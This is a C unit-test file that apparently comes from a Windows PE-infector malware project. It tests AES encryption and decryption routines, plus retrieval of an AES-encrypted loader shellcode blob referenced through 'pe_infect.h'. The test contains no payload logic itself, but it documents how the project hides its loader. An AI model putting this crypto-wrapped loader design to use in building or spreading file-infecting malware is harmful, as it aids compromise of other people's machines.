#include "tests.h"

#include "compat.h"
#include "aes.h"
#include "pe_infect.h"

#include "aes_strings_gen.h"
#include "loader_x86_crypt.h"
_AESDATA_(ldrdata, LOADER_SHELLCODE);


BOOL test_aes(void)
{
    ERRETCP(bInitCompat(LoadLibraryA(TEXT("KERNEL32.dll")), GetProcAddress) == TRUE);

    unsigned char key[KEY_256];
    memset(&key[0], '\0', sizeof(unsigned char)*KEY_256);
    aes_randomkey(&key[0], KEY_256);

    unsigned char ptext[16] = "Attack at dawn!";
    unsigned char ctext[16];
    unsigned char decptext[16];
    aes_ctx_t* ctx;

    memset(&ctext[0], '\0', sizeof(ctext));
    memset(&decptext[0], '\0', sizeof(decptext));

    aes_init();
    ctx = aes_alloc_ctx(key, sizeof(key));
    if(!ctx) {
        return FALSE;
    }
    aes_encrypt(ctx, ptext, ctext);
    aes_decrypt(ctx, ctext, decptext);
    ERRETCP( strlen((char*)decptext) == strlen((char*)ptext) );
    ERRETCP( strcmp((char*)decptext, (char*)ptext) == 0 );

    unsigned char qtext[16] = "blah";
    unsigned char dtext[16];
    unsigned char decqtext[16];

    memset(&dtext[0], '\0', sizeof(dtext));
    memset(&decqtext[0], '\0', sizeof(decqtext));

    aes_encrypt(ctx, qtext, dtext);
    aes_decrypt(ctx, dtext, decqtext);
    ERRETCP( strlen((char*)decqtext) == strlen((char*)qtext) );
    ERRETCP( strcmp((char*)decqtext, (char*)qtext) == 0 );

    {
    char inbuf[] = "This is a short short short short short text, but bigger than 16 bytes ...";
    char *outbuf = NULL;
    char *chkbuf = NULL;
    size_t len = 0;
    outbuf = aes_crypt_s(ctx, inbuf, sizeof(inbuf), &len, TRUE);
    size_t chklen = 0;
    chkbuf = aes_crypt_s(ctx, outbuf, len, &chklen, FALSE);
    ERRETCP( strlen(inbuf) == strlen(chkbuf) );
    ERRETCP( strcmp(inbuf, chkbuf) == 0 );
    COMPAT(free)(outbuf);
    COMPAT(free)(chkbuf);
    }

    aes_free_ctx(ctx);

    {
    unsigned char newkey[] = "\x08\xEE\xD4\xBA\xA0\x86\x6C\x52\x38\x1E\x04\xEA\xD0\xB6\x9C\x82\x68\x4E\x34\x1A\x00\xE6\xCC\xB2\x98\x7E\x64\x4A\x30\x16\xFC\xE2";
    char newbuf[] = "\x3F\x65\xF3\xEC\xF2\xFD\x4D\x1B\xFE\xF5\x12\xE9\x66\x0D\x83\xD3\x1D\xB5\x64\xC1\x9F\x6D\xD2\x51\x51\x64\x89\x22\x94\xBE\x63\x11\x9E\xD7\x7A\x10\x9D\xDF\x22\x57\xB8\xD2\x76\x7E\x4E\x71\x1B\xCB";
    char chkbuf[] = "This is a somewhat stupid test dude ..";
    ctx = aes_alloc_ctx(newkey, sizeof(newkey)-1);
    char* outbuf = aes_crypt_s(ctx, newbuf, sizeof(newbuf)-1, NULL, FALSE);
    ERRETCP( strlen(chkbuf) == strlen(outbuf) );
    ERRETCP( strcmp(outbuf, chkbuf) == 0 );
    aes_free_ctx(ctx);
    COMPAT(free)(outbuf);
    }

    {
    unsigned char newkey[] = "\x81\x88\x8F\x96\x9D\xA4\xAB\xB2\xB9\xC0\xC7\xCE\xD5\xDC\xE3\xEA\xF1\xF8\xFF\x06\x0D\x14\x1B\x22\x29\x30\x37\x3E\x45\x4C\x53\x5A";
    char chkbuf[] = "This is a somewhat stupid test dude ..";
    ctx = aes_alloc_ctx(newkey, sizeof(newkey)-1);
    size_t len = 0, newlen = 0;
    char* outbuf = aes_crypt_s(ctx, chkbuf, sizeof(chkbuf)-1, &len, TRUE);
    char* decbuf = aes_crypt_s(ctx, outbuf, len, &newlen, FALSE);
    ERRETCP( strlen(chkbuf) == strlen(decbuf) );
    ERRETCP( strcmp(decbuf, chkbuf) == 0 );
    ERRETCP( newlen == len );
    aes_free_ctx(ctx);
    COMPAT(free)(outbuf);
    }

    SIZE_T lsiz = 0;
    BYTE* l = getLoader(&lsiz);
    ERRETCP( l != NULL );
    ERRETCP( lsiz > 0 );
    COMPAT(free)(l);

    aes_cleanup();
    return TRUE;
}
